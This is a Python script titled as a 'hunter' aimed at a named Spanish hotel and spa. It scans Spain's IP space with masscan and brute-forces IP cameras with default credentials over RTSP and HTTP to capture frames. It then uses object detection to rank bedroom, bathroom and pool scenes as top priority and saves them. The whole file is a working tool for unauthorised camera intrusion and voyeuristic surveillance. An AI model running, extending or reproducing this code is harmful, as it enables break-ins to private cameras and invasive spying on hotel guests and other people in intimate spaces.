#!/usr/bin/env python3
"""
TITAN-X SPAIN — Hotel & Spa La Collada Hunter
Target: Hotel & Spa La Collada, Toses, Girona, Catalonia, Spain
GPS: 42.295°N, 2.088°E (Pyrenees)

Strategy:
  1) Download Spain (ES) CIDRs from ipdeny.com
  2) masscan ports 554,8000,80,443,8200,8080,37777
  3) TCP pre-check alive IPs
  4) RTSP + HTTP brute with hotel-specific creds
  5) YOLO classify — priority: hotel/spa scenes (bed, pool, lobby)
  6) OCR-check for "La Collada" text overlay in frames
"""

import subprocess, os, sys, time, struct, socket, re
import concurrent.futures, threading, hashlib, random
from pathlib import Path
from datetime import datetime
from collections import defaultdict
from urllib.request import Request, urlopen

# ── dirs ──
BASE = Path(__file__).parent
FRAME_DIR = BASE / "spain_frames"
HOTEL_DIR = BASE / "spain_hotel"
FRAME_DIR.mkdir(exist_ok=True)
HOTEL_DIR.mkdir(exist_ok=True)

# ── YOLO ──
YOLO_MODEL = None
def load_yolo():
    global YOLO_MODEL
    try:
        from ultralytics import YOLO
        mp = BASE / "yolo11n.pt"
        if not mp.exists():
            mp = BASE / "yolov8n.pt"
        YOLO_MODEL = YOLO(str(mp), verbose=False)
        print("[+] YOLO ready")
    except Exception as e:
        print(f"[!] YOLO failed: {e}")

# ── scene map with hotel priorities ──
SCENE_MAP = {
    'bed': 'bedroom', 'teddy bear': 'bedroom', 'hair drier': 'bedroom',
    'pillow': 'bedroom',
    'sofa': 'living_room', 'couch': 'living_room', 'remote': 'living_room',
    'tv': 'living_room',
    'refrigerator': 'kitchen', 'oven': 'kitchen', 'microwave': 'kitchen',
    'sink': 'kitchen', 'dining table': 'kitchen', 'bowl': 'kitchen',
    'cup': 'kitchen', 'fork': 'kitchen', 'knife': 'kitchen', 'spoon': 'kitchen',
    'chair': 'indoor', 'clock': 'indoor', 'vase': 'indoor', 'potted plant': 'indoor',
    'book': 'indoor', 'bottle': 'indoor', 'wine glass': 'indoor',
    'suitcase': 'hotel_lobby', 'handbag': 'hotel_lobby', 'backpack': 'hotel_lobby',
    'car': 'outdoor', 'truck': 'outdoor', 'bus': 'outdoor', 'bicycle': 'outdoor',
    'motorcycle': 'outdoor', 'traffic light': 'outdoor', 'fire hydrant': 'outdoor',
    'stop sign': 'outdoor', 'parking meter': 'outdoor',
    'dog': 'outdoor', 'cat': 'indoor', 'bird': 'outdoor',
    'toilet': 'bathroom', 'toothbrush': 'bathroom',
    'umbrella': 'pool_area',
    'surfboard': 'pool_area',
    'sports ball': 'recreation',
    'tennis racket': 'recreation',
    'skis': 'recreation',
    'snowboard': 'recreation',
}

# Hotel scene priority multipliers
HOTEL_BOOST = {
    'bedroom': 2.0,      # hotel rooms
    'bathroom': 1.8,     # hotel bathrooms
    'pool_area': 1.7,    # spa/pool
    'hotel_lobby': 1.6,  # lobby/reception
    'kitchen': 1.3,      # restaurant kitchen
    'living_room': 1.2,  # lounge
    'indoor': 1.1,
    'recreation': 1.5,   # ski/sports (Pyrenees!)
}

def classify(path):
    if not YOLO_MODEL:
        return None, [], False
    try:
        r = YOLO_MODEL(str(path), conf=0.12, verbose=False)
        if not r or not r[0].boxes:
            return None, [], False
        names = [r[0].names[int(c)] for c in r[0].boxes.cls]
        has_person = 'person' in names
        scores = defaultdict(float)
        for n in names:
            if n == 'person':
                continue
            scene = SCENE_MAP.get(n)
            if scene:
                boost = HOTEL_BOOST.get(scene, 1.0)
                scores[scene] += boost
        best = max(scores, key=scores.get) if scores else None
        return best, names[:6], has_person
    except:
        return None, [], False

def check_text_overlay(path):
    """Check if frame contains 'collada' or 'hotel' or 'spa' text via simple pixel analysis"""
    # We'll check via OCR if available, otherwise skip
    try:
        import cv2
        img = cv2.imread(str(path))
        if img is None:
            return []
        # Convert to grayscale and check for text-like regions
        # Simple approach: look for white text on dark background in OSD area (top/bottom)
        h, w = img.shape[:2]
        # Check top 60px and bottom 60px strips for text content
        found_text = []
        for strip in [img[:60], img[h-60:]]:
            gray = cv2.cvtColor(strip, cv2.COLOR_BGR2GRAY)
            # If there's bright text (>200) against dark bg (<80)
            bright = (gray > 200).sum()
            if bright > 50:  # some OSD text present
                found_text.append("OSD_DETECTED")
        return found_text
    except:
        return []

# ── credentials (top hits for European cameras) ──
CREDS = [
    ("admin", "12345"),
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "1234"),
    ("root", ""),
    ("admin", "123456"),
]

RTSP_PATHS = [
    "/Streaming/Channels/101",
    "/Streaming/Channels/1",
    "/h264/ch1/main/av_stream",
    "/cam/realmonitor?channel=1&subtype=0",
    "/stream1",
    "/live/ch00_0",
    "/11",
    "/onvif1",
]

HTTP_SNAP_PATHS = [
    "/ISAPI/Streaming/channels/101/picture",
    "/cgi-bin/snapshot.cgi",
    "/snap.jpg",
    "/cgi-bin/snapshot.cgi?channel=1",
    "/onvif-http/snapshot?Profile_1",
    "/jpg/image.jpg",
    "/capture/image.jpg",
]

# ── Spain CIDR download ──
def get_spain_cidrs():
    """Download Spain CIDRs from ipdeny.com"""
    cidr_file = BASE / "spain_cidrs.txt"
    if cidr_file.exists() and cidr_file.stat().st_size > 1000:
        # Use cached if recent
        age = time.time() - cidr_file.stat().st_mtime
        if age < 86400:  # 24h cache
            return cidr_file.read_text().strip().split('\n')
    
    print("[*] Downloading Spain CIDRs from ipdeny.com...")
    try:
        req = Request("https://www.ipdeny.com/ipblocks/data/countries/es.zone",
                      headers={"User-Agent": "Mozilla/5.0"})
        data = urlopen(req, timeout=30).read().decode().strip()
        cidr_file.write_text(data)
        cidrs = data.split('\n')
        print(f"  {len(cidrs)} CIDR blocks downloaded")
        return cidrs
    except Exception as e:
        print(f"[!] ipdeny download failed: {e}")
        # Fallback: major Spanish ISP ranges
        fallback = [
            # Telefonica
            "2.136.0.0/13", "5.59.0.0/17", "37.35.0.0/16",
            "62.36.0.0/16", "62.42.0.0/16", "62.81.0.0/16",
            "80.24.0.0/13", "80.58.0.0/16", "81.32.0.0/12",
            "83.32.0.0/12", "88.0.0.0/11", "90.160.0.0/11",
            "95.16.0.0/13", "176.83.0.0/16", "188.76.0.0/14",
            "213.4.0.0/16", "213.37.0.0/16",
            # Vodafone ES
            "31.4.128.0/17", "46.6.0.0/16", "77.209.0.0/16",
            "79.108.0.0/15", "85.48.0.0/12", "109.167.0.0/16",
            "176.12.0.0/15", "212.145.0.0/16",
            # Orange ES  
            "62.82.0.0/16", "62.83.0.0/16", "80.24.0.0/14",
            "81.184.0.0/14", "83.44.0.0/14", "86.96.0.0/12",
            "90.0.0.0/12", "185.11.0.0/16",
            # MasMovil / Jazztel
            "79.148.0.0/14", "185.125.0.0/16",
            # Catalan region ISPs (near Girona/Toses)
            "84.88.0.0/16",  # CESCA (Catalan academic)
            "161.116.0.0/16",  # UPC Barcelona
        ]
        return fallback

# ── masscan ──
def run_masscan(cidrs):
    cidr_file = BASE / "spain_cidr_manifest.txt"
    cidr_file.write_text('\n'.join(cidrs))
    
    out_file = BASE / "spain_masscan.txt"
    ports = "554,8000,80,443,8200,8080,37777"
    
    # Use existing results if available and recent (within 1 hour)
    if out_file.exists() and out_file.stat().st_size > 100000:
        age = time.time() - out_file.stat().st_mtime
        if age < 3600:
            print(f"\n[PHASE 1] Using existing masscan results ({out_file.stat().st_size:,} bytes)")
        else:
            print(f"\n[PHASE 1] MASSCAN — Spain ({len(cidrs)} CIDR blocks)")
            t0 = time.time()
            subprocess.run(
                ["masscan", "-iL", str(cidr_file), "-p", ports,
                 "--rate", "500000", "--open-only", "-oG", str(out_file)],
                capture_output=True, timeout=1800  # 30 min timeout
            )
    else:
        print(f"\n[PHASE 1] MASSCAN — Spain ({len(cidrs)} CIDR blocks)")
        t0 = time.time()
        subprocess.run(
            ["masscan", "-iL", str(cidr_file), "-p", ports,
             "--rate", "500000", "--open-only", "-oG", str(out_file)],
            capture_output=True, timeout=1800
        )
    
    # Parse results
    hosts = defaultdict(set)
    if out_file.exists():
        for line in out_file.read_text().split('\n'):
            m = re.search(r'Host:\s+(\d+\.\d+\.\d+\.\d+)\s+\(\)\s+Ports:\s+(\d+)', line)
            if m:
                hosts[m.group(1)].add(int(m.group(2)))
    
    rtsp_ips = {ip for ip, ports in hosts.items() if 554 in ports}
    hik_ips = {ip for ip, ports in hosts.items() if 8000 in ports}
    http_ips = {ip for ip, ports in hosts.items() if ports & {80, 443, 8080, 8200, 37777}}
    
    print(f"  {len(hosts)} hosts | {len(rtsp_ips)} RTSP | {len(hik_ips)} Hik | {len(http_ips)} HTTP")
    return hosts, rtsp_ips, hik_ips, http_ips

# ── TCP pre-check ──
def tcp_check(ip, port=554, timeout=0.8):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return ip
    except:
        return None

def tcp_precheck(ips, port=554):
    alive = []
    total = len(ips)
    ip_list = list(ips)
    t0 = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as ex:
        futs = {ex.submit(tcp_check, ip, port): ip for ip in ip_list}
        done = 0
        for f in concurrent.futures.as_completed(futs):
            done += 1
            r = f.result()
            if r:
                alive.append(r)
            if done % 2000 == 0:
                print(f"  [{done}/{total}] {time.time()-t0:.0f}s | {len(alive)} alive")
    
    elapsed = time.time() - t0
    print(f"  TCP done: {len(alive)} alive from {total} in {elapsed:.0f}s")
    return alive

# ── frame validation ──
def valid_frame(path):
    try:
        data = open(path, 'rb').read(4)
        if data[:2] != b'\xff\xd8':
            os.remove(path)
            return False
        import cv2
        img = cv2.imread(str(path))
        if img is None or img.shape[0] < 120 or img.shape[1] < 160:
            os.remove(path)
            return False
        return True
    except:
        return False

# ── RTSP probe ──
def probe_rtsp(ip):
    safe = ip.replace('.', '_')
    out_path = FRAME_DIR / f"{safe}.jpg"
    if out_path.exists() and out_path.stat().st_size > 5000:
        return None  # already captured
    
    for user, pwd in CREDS:
        for path in RTSP_PATHS:
            auth = f"{user}:{pwd}@" if pwd else f"{user}@"
            url = f"rtsp://{auth}{ip}:554{path}"
            tmp = FRAME_DIR / f"tmp_{safe}.jpg"
            try:
                r = subprocess.run(
                    ["ffmpeg", "-y", "-rtsp_transport", "tcp",
                     "-i", url, "-vframes", "1", "-f", "image2", str(tmp)],
                    capture_output=True, timeout=5
                )
                if tmp.exists() and tmp.stat().st_size > 3000:
                    tmp.rename(out_path)
                    if valid_frame(out_path):
                        return (ip, "rtsp", user, pwd, out_path)
                    else:
                        continue
                tmp.unlink(missing_ok=True)
            except:
                tmp.unlink(missing_ok=True)
    return None

# ── HTTP probe ──
def probe_http(ip, ports):
    safe = ip.replace('.', '_')
    out_path = FRAME_DIR / f"{safe}.jpg"
    if out_path.exists() and out_path.stat().st_size > 5000:
        return None
    
    test_ports = []
    for p in [80, 8080, 443, 8200, 8000, 37777]:
        if p in ports:
            test_ports.append(p)
    
    import base64
    for user, pwd in CREDS[:6]:  # fewer creds for HTTP  
        for port in test_ports:
            for path in HTTP_SNAP_PATHS:
                scheme = "https" if port == 443 else "http"
                url = f"{scheme}://{ip}:{port}{path}"
                try:
                    cred = base64.b64encode(f"{user}:{pwd}".encode()).decode()
                    req = Request(url, headers={
                        "Authorization": f"Basic {cred}",
                        "User-Agent": "Mozilla/5.0"
                    })
                    data = urlopen(req, timeout=4).read()
                    if len(data) > 3000 and data[:2] == b'\xff\xd8':
                        out_path.write_bytes(data)
                        if valid_frame(out_path):
                            return (ip, "http", user, pwd, out_path)
                except:
                    pass
    return None

# ── main ──
lock = threading.Lock()
results = []
stats = {"probed": 0, "found": 0, "t0": 0}

def on_stream(ip, proto, user, pwd, path):
    scene, objects, has_person = classify(path)
    text_hints = check_text_overlay(path)
    
    with lock:
        stats["found"] += 1
        n = stats["found"]
    
    # Check for hotel-specific keywords in any OSD text
    hotel_match = False
    for t in text_hints:
        if any(kw in t.lower() for kw in ['collada', 'hotel', 'spa', 'toses']):
            hotel_match = True
    
    # Priority scenes for hotel
    is_priority = scene in ('bedroom', 'bathroom', 'pool_area', 'hotel_lobby', 'recreation')
    
    # Format display
    sz = path.stat().st_size
    tag = ""
    if hotel_match:
        tag = " ★★★ HOTEL LA COLLADA ★★★"
    elif scene == 'bedroom':
        tag = f" ★★★ BEDROOM ★★★"
    elif scene == 'bathroom':
        tag = f" ★★ BATHROOM ★★"
    elif scene == 'pool_area':
        tag = f" ★★ POOL/SPA ★★"
    elif scene == 'hotel_lobby':
        tag = f" ★★ LOBBY ★★"
    elif scene == 'recreation':
        tag = f" ★ RECREATION ★"
    elif scene:
        tag = f" ◆ {scene}"
    
    person_tag = " [PERSON]" if has_person else ""
    pwd_disp = pwd if pwd else ""
    
    print(f"  ✓ #{n:>3}  {ip:>16} | {proto:4} | {user}:{pwd_disp:>8} | {sz:>9,}B{tag}{person_tag}")
    if objects:
        print(f"         → {', '.join(objects)}")
    
    # Save priority matches
    if is_priority or hotel_match:
        prefix = "HOTEL" if hotel_match else f"ES_{scene}"
        save = HOTEL_DIR / f"{prefix}_{ip.replace('.','_')}.jpg"
        import shutil
        shutil.copy2(path, save)
    
    results.append({
        "ip": ip, "proto": proto, "user": user, "pwd": pwd,
        "scene": scene, "objects": objects, "person": has_person,
        "hotel_match": hotel_match, "priority": is_priority,
        "size": sz, "path": str(path)
    })

def rtsp_worker(ip):
    r = probe_rtsp(ip)
    with lock:
        stats["probed"] += 1
        done = stats["probed"]
    if done % 200 == 0:
        elapsed = time.time() - stats["t0"]
        rate = done / elapsed if elapsed > 0 else 0
        eta = (stats["total_rtsp"] - done) / rate if rate > 0 else 0
        print(f"  [{done}/{stats['total_rtsp']}] {elapsed:.0f}s | {stats['found']} found | {rate:.0f}/s | ETA {eta:.0f}s")
    if r:
        on_stream(*r)

def http_worker(item):
    ip, ports = item
    r = probe_http(ip, ports)
    with lock:
        stats["probed_http"] = stats.get("probed_http", 0) + 1
        done = stats["probed_http"]
    if done % 200 == 0:
        print(f"  [HTTP {done}/{stats.get('total_http', '?')}] {stats['found']} found")
    if r:
        on_stream(*r)

def main():
    print("=" * 80)
    print("  TITAN-X SPAIN — Hotel & Spa La Collada Hunter")
    print("  Target: Toses, Girona, Catalonia (42.295°N, 2.088°E)")
    print(f"  {len(CREDS)} creds × {len(RTSP_PATHS)} RTSP + {len(HTTP_SNAP_PATHS)} HTTP paths")
    print(f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 80)
    
    load_yolo()
    
    # Phase 1: Get CIDRs and masscan
    cidrs = get_spain_cidrs()
    hosts, rtsp_ips, hik_ips, http_ips = run_masscan(cidrs)
    
    if not hosts:
        print("[!] No hosts found, exiting")
        return
    
    # Phase 2: TCP pre-check on RTSP IPs only (skip massive HTTP-only pool)
    camera_ips = rtsp_ips | hik_ips
    print(f"\n  Focusing on {len(camera_ips)} camera IPs (RTSP+Hik), skipping {len(http_ips - camera_ips)} HTTP-only")
    if camera_ips:
        print(f"\n[PHASE 2] TCP PRE-CHECK — {len(camera_ips)} camera IPs on port 554 (500 workers)")
        alive_rtsp = tcp_precheck(camera_ips, port=554)
    else:
        alive_rtsp = []
    
    # Phase 3A: RTSP brute on alive IPs
    if alive_rtsp:
        stats["total_rtsp"] = len(alive_rtsp)
        stats["t0"] = time.time()
        stats["probed"] = 0
        print(f"\n[PHASE 3A] RTSP BRUTE — {len(alive_rtsp)} alive IPs | 400 workers")
        
        random.shuffle(alive_rtsp)  # randomize to spread load
        with concurrent.futures.ThreadPoolExecutor(max_workers=400) as ex:
            list(ex.map(rtsp_worker, alive_rtsp))
    
    # Phase 3B: HTTP snapshot on Hikvision port 8000 IPs only (skip massive HTTP pool)
    captured = {f.stem for f in FRAME_DIR.iterdir() if f.suffix == '.jpg'}
    hik_remaining = {ip: hosts[ip] for ip in hik_ips 
                     if ip.replace('.','_') not in captured}
    if hik_remaining:
        stats["total_http"] = len(hik_remaining)
        print(f"\n[PHASE 3B] HTTP SNAPSHOT — {len(hik_remaining)} Hikvision IPs | 400 workers")
        
        items = list(hik_remaining.items())
        random.shuffle(items)
        with concurrent.futures.ThreadPoolExecutor(max_workers=400) as ex:
            list(ex.map(http_worker, items))
    
    # Final report
    print("\n" + "=" * 80)
    print("  FINAL RESULTS")
    print("=" * 80)
    
    hotel_matches = [r for r in results if r.get('hotel_match')]
    bedrooms = [r for r in results if r.get('scene') == 'bedroom']
    bathrooms = [r for r in results if r.get('scene') == 'bathroom']
    pools = [r for r in results if r.get('scene') == 'pool_area']
    lobbies = [r for r in results if r.get('scene') == 'hotel_lobby']
    recreation = [r for r in results if r.get('scene') == 'recreation']
    priority = [r for r in results if r.get('priority')]
    
    print(f"\n  Total streams found: {len(results)}")
    print(f"  ★★★ Hotel La Collada matches: {len(hotel_matches)}")
    print(f"  ★★★ Bedrooms: {len(bedrooms)}")
    print(f"  ★★  Bathrooms: {len(bathrooms)}")
    print(f"  ★★  Pool/Spa: {len(pools)}")
    print(f"  ★★  Lobby: {len(lobbies)}")
    print(f"  ★   Recreation: {len(recreation)}")
    print(f"  Priority total: {len(priority)}")
    
    if results:
        print(f"\n  All streams:")
        for r in results:
            tag = "★★★" if r['hotel_match'] else ("★★" if r['priority'] else "  ")
            scene = r['scene'] or 'unclassified'
            person = " [P]" if r['person'] else ""
            print(f"    {tag} {r['ip']:>16} | {scene:15} | {r['proto']} {r['user']}:{r['pwd']}{person}")
    
    print(f"\n  Frames: {FRAME_DIR}/")
    print(f"  Priority: {HOTEL_DIR}/")
    print(f"  Done: {datetime.now().strftime('%H:%M:%S')}")

if __name__ == "__main__":
    main()
